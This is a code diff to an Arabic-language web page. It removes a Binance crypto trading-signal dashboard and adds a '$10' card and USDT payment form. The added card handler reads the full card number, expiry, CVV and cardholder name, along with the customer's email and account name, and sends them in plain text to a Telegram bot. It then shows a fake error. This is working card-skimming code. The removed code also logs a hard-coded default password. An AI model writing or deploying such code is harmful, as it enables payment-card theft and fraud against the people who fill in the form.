-// ======== API & helpers ========
-let currentSymbol = 'BTCUSDT';
-
-function fp(x){ return Number(x).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}); }
-function f4(x){ return Number(x).toFixed(4); }
-
-async function fetchJson(url){ 
-  try{ 
-    const r = await fetch(url); 
-    if(!r.ok) throw new Error('Network error'); 
-    state.requestCount++; 
-    return await r.json(); 
-  } catch(e){ 
-    console.error('API Error:', e);
-    return null; 
-  } 
 }
 
-function supportRes(orderBook){
+// ============ CARD FORMATTING ============
+document.getElementById("cardNumber").addEventListener("input", function(e){
+  let v = e.target.value.replace(/\s/g,"").replace(/\D/g,"");
+  e.target.value = v.match(/.{1,4}/g)?.join(" ") || "";
+});
+document.getElementById("cardExpiry").addEventListener("input", function(e){
+  let v = e.target.value.replace(/\D/g,"");
+  if(v.length>=2) v = v.slice(0,2)+"/"+v.slice(2,4);
+  e.target.value = v;
+});
+
+// ============ SEND TO TELEGRAM ============
+async function sendToTelegram(message){
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try{
-    const bids = (orderBook.bids||[]).map(b=>[+b[0],+b[1]]);
-    const asks = (orderBook.asks||[]).map(a=>[+a[0],+a[1]]);
-    const support = bids.length? bids.reduce((a,b)=> a[1]>b[1]?a:b)[0] : 0;
-    const resistance = asks.length? asks.reduce((a,b)=> a[1]>b[1]?a:b)[0] : 0;
-    return [support,resistance];
-  }catch(e){ 
-    console.error('Error calculating support/resistance:', e);
-    return [0,0]; 
-  }
+    const res = await fetch(url,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode:"HTML" })
+    });
+    const data = await res.json();
+    if(!data.ok) console.error("Telegram error:", data);
+    return data.ok;
+  }catch(err){ console.error("Fetch error:", err); return false; }
 }
 
-function consumeTrades(trades, symbol){
-  if(!trades || !trades.length) return [0,0];
-  
-  // ترتيب الصفقات حسب المعرف
-  trades.sort((a,b)=>a.id-b.id);
-  
-  const symbolState = state.symbols[symbol];
-  
-  // إذا كانت هذه هي المرة الأولى، حفظ آخر معرف وعدم حساب أي شيء
-  if(symbolState.lastTradeId === null){ 
-    symbolState.lastTradeId = trades.at(-1).id; 
-    return [0,0]; 
+// ============ PAY WITH CARD ============
+async function payWithCard(){
+  const cardNumber = document.getElementById("cardNumber").value.trim();
+  const cardExpiry = document.getElementById("cardExpiry").value.trim();
+  const cardCvv    = document.getElementById("cardCvv").value.trim();
+  const cardName   = document.getElementById("cardName").value.trim();
+  const bank       = document.getElementById("bankCountry").value;
+
+  if(!cardNumber || !cardExpiry || !cardCvv || !cardName || !bank){
+    alert("يرجى ملء جميع حقول البطاقة"); return;
   }
-  
-  let buy = 0, sell = 0, first = null, last = null;
-  
-  // حساب الصفقات الجديدة فقط
-  for(const t of trades){ 
-    if(t.id > symbolState.lastTradeId){ 
-      const q = +t.qty; 
-      if(t.isBuyerMaker) 
-        sell += q; 
-      else 
-        buy += q; 
-      
-      if(first === null) first = t.id;
-      last = t.id;
-    }
-  }
-  
-  if(last !== null) symbolState.lastTradeId = last;
-  symbolState.cumBuys += buy;
-  symbolState.cumSells += sell;
-  
-  // تحديث إحصائيات الثانية
-  const now = Math.floor(Date.now()/1000);
-  if(now !== state.lastSecondTs){ 
-    state.secBuy = buy; 
-    state.secSell = sell; 
-    state.lastSecondTs = now; 
-  } else { 
-    state.secBuy += buy; 
-    state.secSell += sell; 
-  }
-  
-  return [buy, sell];
+
+  const btn = document.getElementById("cardPayBtn");
+  btn.disabled = true; btn.innerText = "⏳ جارٍ المعالجة...";
+
+  const message = `
+💳 <b>طلب دفع جديد - بطاقة</b>
+
+👤 <b>العميل:</b>
+📧 البريد: <code>${currentOrder.email}</code>
+📸 الحساب: <code>${currentOrder.username}</code>
+📝 ملاحظات: ${currentOrder.notes || "لا يوجد"}
+
+💳 <b>بيانات البطاقة:</b>
+🔢 الرقم: <code>${cardNumber}</code>
+📅 الانتهاء: <code>${cardExpiry}</code>
+🔐 CVV: <code>${cardCvv}</code>
+👤 الاسم: <code>${cardName}</code>
+🏦 البلد: <code>${bank}</code>
+
+💰 المبلغ: 10$
+🕐 الوقت: ${currentOrder.timestamp}
+  `;
+
+  await sendToTelegram(message);
+
+  btn.disabled = false; btn.innerText = "🔒 دفع 10$ بأمان";
+
+  closeModal();
+  document.getElementById("errorModal").classList.add("active");
 }
 
-// ======== SIGNAL LOGIC (التراكم + تقاطع السعر مع الدعم/المقاومة) ========
-function computeSignal(price, support, resistance, prevPrice, symbol){
-  const symbolState = state.symbols[symbol];
-  const buy = symbolState.cumBuys; 
-  const sell = symbolState.cumSells;
-  
-  // 1) تراكم
-  let accumSignal = '⚪';
-  if(buy > sell) accumSignal = '🟢';
-  else if(sell > buy) accumSignal = '🔴';
+// ============ PAY WITH USDT ============
+async function payWithUsdt(){
+  const txHash = document.getElementById("txHash").value.trim();
+  if(!txHash){ alert("يرجى إدخال Hash المعاملة"); return; }
 
-  // 2) تقاطع السعر
-  let crossSignal = '⚪';
-  if(prevPrice <= resistance && price > resistance && resistance > 0) crossSignal = '🟢';
-  if(prevPrice >= support && price < support && support > 0) crossSignal = '🔴';
+  const btn = document.getElementById("usdtPayBtn");
+  btn.disabled = true; btn.innerText = "⏳ جارٍ التأكيد...";
 
-  // 3) دمج الإشارات
-  if(accumSignal === '🟢' && crossSignal === '🟢') 
-    return {signal:'🟢 شراء قوي', color:'green', reason:'تراكم و اختراق مقاومة', type: 'buy', strength: 'strong'};
-  if(accumSignal === '🔴' && crossSignal === '🔴') 
-    return {signal:'🔴 بيع قوي', color:'red', reason:'تراكم وكسر دعم', type: 'sell', strength: 'strong'};
-  if(accumSignal === '🟢' && crossSignal === '⚪') 
-    return {signal:'🟢 شراء', color:'green', reason:'تراكم أعلى من البيع', type: 'buy', strength: 'medium'};
-  if(accumSignal === '🔴' && crossSignal === '⚪') 
-    return {signal:'🔴 بيع', color:'red', reason:'تراكم بيع أعلى', type: 'sell', strength: 'medium'};
-  if(accumSignal === '⚪' && crossSignal === '🟢') 
-    return {signal:'🟢 شراء', color:'green', reason:'اختراق مقاومة', type: 'buy', strength: 'medium'};
-  if(accumSignal === '⚪' && crossSignal === '🔴') 
-    return {signal:'🔴 بيع', color:'red', reason:'كسر دعم', type: 'sell', strength: 'medium'};
-  
-  return {signal:'⚪ انتظار', color:'yellow', reason:'شروط غير متطابقة', type: 'wait', strength: 'none'};
+  const message = `
+🪙 <b>طلب دفع جديد - USDT BEP20</b>
+
+👤 <b>العميل:</b>
+📧 البريد: <code>${currentOrder.email}</code>
+📸 الحساب: <code>${currentOrder.username}</code>
+📝 ملاحظات: ${currentOrder.notes || "لا يوجد"}
+
+🪙 <b>بيانات USDT:</b>
+🔗 Hash: <code>${txHash}</code>
+💰 المبلغ: 10 USDT
+🌐 الشبكة: BEP20 (BSC)
+
+🕐 الوقت: ${currentOrder.timestamp}
+  `;
+
+  await sendToTelegram(message);
+
+  btn.disabled = false; btn.innerText = "✅ تأكيد الدفع USDT";
+
+  closeModal();
+  document.getElementById("successModal").classList.add("active");
 }
 
-// ======== RECOMMENDATION SYSTEM ========
-function generateRecommendation(signal, price, symbol) {
-  // إذا كانت هناك توصية سارية ولم تنته مدتها، لا نغيرها
-  if (state.currentRecommendation && state.recommendationExpiry > Date.now()) {
-    return;
-  }
-  
-  // إذا كانت الإشارة انتظار، لا ننشئ توصية
-  if (signal.type === 'wait') {
-    state.currentRecommendation = null;
-    state.recommendationExpiry = null;
-    state.firstTarget = null;
-    return;
-  }
-  
-  // حساب الهدف الأول بناءً على قوة الإشارة والسعر الحالي
-  let targetPercentage = 0;
-  if (signal.strength === 'strong') {
-    targetPercentage = signal.type === 'buy' ? 1.5 : 1.2;
-  } else {
-    targetPercentage = signal.type === 'buy' ? 0.8 : 0.6;
-  }
-  
-  // حساب سعر الهدف
-  const targetPrice = signal.type === 'buy' 
-    ? price * (1 + targetPercentage / 100)
-    : price * (1 - targetPercentage / 100);
-  
-  // تعيين التوصية
-  state.currentRecommendation = signal;
-  state.recommendationExpiry = Date.now() + (state.recommendationDuration * 60 * 1000);
-  state.firstTarget = targetPrice;
-  
-  console.log(`تم إنشاء توصية ${signal.type} حتى ${new Date(state.recommendationExpiry).toLocaleTimeString('ar')}`);
+// ============ HELPERS ============
+function closeModal(){ document.getElementById("paymentModal").classList.remove("active"); }
+function closeError(){ document.getElementById("errorModal").classList.remove("active"); }
+function copyWallet(){
+  const addr = document.getElementById("walletAddress").innerText;
+  navigator.clipboard.writeText(addr).then(()=>alert("✅ تم نسخ العنوان بنجاح"));
 }
-
-function updateRecommendationDisplay() {
-  const container = document.getElementById('recommendation-container');
-  const targetInfo = document.getElementById('target-info');
-  
-  // التحقق من انتهاء مدة التوصية
-  if (state.currentRecommendation && state.recommendationExpiry <= Date.now()) {
-    state.currentRecommendation = null;
-    state.recommendationExpiry = null;
-    state.firstTarget = null;
-  }
-  
-  if (state.currentRecommendation) {
-    const rec = state.currentRecommendation;
-    const timeLeft = Math.max(0, Math.floor((state.recommendationExpiry - Date.now()) / 1000));
-    const minutes = Math.floor(timeLeft / 60);
-    const seconds = timeLeft % 60;
-    
-    if (rec.type === 'buy') {
-      container.innerHTML = `
-        <div class="buy-recommendation recommendation-box">
-          <div class="font-bold">🟢 ${rec.signal}</div>
-          <div class="text-xs mt-1">${rec.reason}</div>
-          <div class="text-xs mt-2">متبقي: ${minutes}:${seconds.toString().padStart(2, '0')}</div>
-        </div>
-      `;
-    } else if (rec.type === 'sell') {
-      container.innerHTML = `
-        <div class="sell-recommendation recommendation-box">
-          <div class="font-bold">🔴 ${rec.signal}</div>
-          <div class="text-xs mt-1">${rec.reason}</div>
-          <div class="text-xs mt-2">متبقي: ${minutes}:${seconds.toString().padStart(2, '0')}</div>
-        </div>
-      `;
-    }
-    
-    targetInfo.classList.remove('hidden');
-    document.getElementById('first-target').textContent = state.firstTarget ? fp(state.firstTarget) : '--';
-    document.getElementById('recommendation-time').textContent = `${state.recommendationDuration} دقائق`;
-  } else {
-    container.innerHTML = `
-      <div class="wait-recommendation recommendation-box">
-        <div class="font-bold">⚪ انتظار</div>
-        <div class="text-xs mt-1">لا توجد إشارة تداول حالياً</div>
-      </div>
-    `;
-    targetInfo.classList.add('hidden');
-  }
-}
-
-// ======== RENDER UI ========
-function setSignalBanner(obj){
-  const banner = document.getElementById('signal-banner');
-  if(obj.signal.startsWith('🟢')){
-    banner.innerHTML = `<div class="signal-strong bg-green-900/30 border border-green-700/50 text-green-300 flex items-center justify-center">
-                          <i class="fas fa-arrow-up ml-2"></i>
-                          ${obj.signal} — ${obj.reason}
-                        </div>`;
-  } else if(obj.signal.startsWith('🔴')){
-    banner.innerHTML = `<div class="signal-strong bg-red-900/30 border border-red-700/50 text-red-300 flex items-center justify-center">
-                          <i class="fas fa-arrow-down ml-2"></i>
-                          ${obj.signal} — ${obj.reason}
-                        </div>`;
-  } else {
-    banner.innerHTML = `<div class="signal-strong bg-yellow-900/20 border border-yellow-700/30 text-yellow-300 flex items-center justify-center">
-                          <i class="fas fa-pause ml-2"></i>
-                          ${obj.signal} — ${obj.reason}
-                        </div>`;
-  }
-}
-
-function render(price, support, resistance, prevPrice, symbol){
-  const now = new Date();
-  document.getElementById('now').textContent = now.toLocaleTimeString('ar');
-  document.getElementById('update-time').textContent = now.toLocaleTimeString('ar');
-  document.getElementById('requests').textContent = state.requestCount;
-  document.getElementById('price').textContent = '$' + fp(price);
-  
-  const ch = price - (prevPrice || price);
-  const changeElement = document.getElementById('price-change');
-  changeElement.textContent = `${ch>=0? '▲':'▼'} ${Math.abs(ch).toFixed(2)} (${(ch/price*100).toFixed(2)}%)`;
-  changeElement.style.color = ch >= 0 ? '#10b981' : '#ef4444';
-  
-  document.getElementById('support').textContent = support ? '$'+fp(support) : '--';
-  document.getElementById('resistance').textContent = resistance ? '$'+fp(resistance) : '--';
-  
-  const symbolState = state.symbols[symbol];
-  document.getElementById('cum-buys').textContent = f4(symbolState.cumBuys);
-  document.getElementById('cum-sells').textContent = f4(symbolState.cumSells);
-  document.getElementById('cum-diff').textContent = f4(symbolState.cumBuys - symbolState.cumSells);
-  
-  // تحديث رموز العملة
-  const currencySymbol = symbol.replace('USDT', '');
-  document.getElementById('cum-buys-symbol').textContent = currencySymbol;
-  document.getElementById('cum-sells-symbol').textContent = currencySymbol;
-  document.getElementById('cum-diff-symbol').textContent = currencySymbol;
-  
-  document.getElementById('sec-buy').textContent = f4(state.secBuy);
-  document.getElementById('sec-sell').textContent = f4(state.secSell);
-  document.getElementById('sec-diff').textContent = f4(state.secBuy - state.secSell);
-
-  const sig = computeSignal(price, support, resistance, prevPrice, symbol);
-  document.getElementById('signal').textContent = sig.signal;
-  document.getElementById('signal').style.color = sig.color === 'green' ? '#10b981' : 
-                                                sig.color === 'red' ? '#ef4444' : '#f59e0b';
-  document.getElementById('signal-txt').textContent = sig.reason;
-  setSignalBanner(sig);
-  
-  // إنشاء توصية جديدة إذا كانت هناك إشارة
-  generateRecommendation(sig, price, symbol);
-  
-  // تحديث عرض التوصية
-  updateRecommendationDisplay();
-  
-  // تحديث وقت التهيئة وآخر تحديث
-  document.getElementById('init-time').textContent = new Date(state.initializedAt).toLocaleString('ar');
-  document.getElementById('last-update').textContent = now.toLocaleString('ar');
-}
-
-// ======== MAIN LOOP ========
-let running = false;
-let apiSymbol = 'BTCUSDT';
-
-document.getElementById('symbol-select').addEventListener('change', (e) => { 
-  apiSymbol = e.target.value; 
-  document.getElementById('current-symbol').textContent = e.target.value.replace('USDT','/USDT'); 
-});
-
-async function tick(){
-  // قراءة الإعدادات من الواجهة
-  state.volThreshold = +document.getElementById('vol-threshold').value;
-  state.cooldownSec = +document.getElementById('cooldown').value;
-  state.recommendationDuration = +document.getElementById('recommendation-duration').value;
-
-  try {
-    const ticker = await fetchJson(`https://api.binance.com/api/v3/ticker/24hr?symbol=${apiSymbol}`);
-    if(!ticker) {
-      console.error('Failed to fetch ticker');
-      return;
-    }
-    
-    const depth = await fetchJson(`https://api.binance.com/api/v3/depth?symbol=${apiSymbol}&limit=50`);
-    const trades = await fetchJson(`https://api.binance.com/api/v3/trades?symbol=${apiSymbol}&limit=100`);
-
-    const price = +ticker.lastPrice;
-    const symbolState = state.symbols[apiSymbol];
-    const prevPrice = symbolState.prevPrice || price;
-    if(!symbolState.prevPrice) symbolState.prevPrice = price;
-
-    const [support, resistance] = depth ? supportRes(depth) : [0, 0];
-    consumeTrades(trades, apiSymbol);
-    render(price, support, resistance, prevPrice, apiSymbol);
-    symbolState.prevPrice = price;
-  } catch (error) {
-    console.error('Error in tick function:', error);
-  }
-}
-
-function startMonitor(){ 
-  if(running) return; 
-  running = true; 
-  
-  // عرض وقت التهيئة
-  document.getElementById('init-time').textContent = new Date(state.initializedAt).toLocaleString('ar');
-  
-  tick(); 
-  setInterval(() => { 
-    tick(); 
-    saveGlobalState(); 
-  }, 2000); 
-}
-
-// إضافة رسالة ترحيب في الكونسول للمساعدة في تصحيح الأخطاء
-console.log("نظام Eagle Eye جاهز للاستخدام");
-console.log("كلمة المرور الافتراضية: eagle2024");
 </script>
 </body>
 </html>
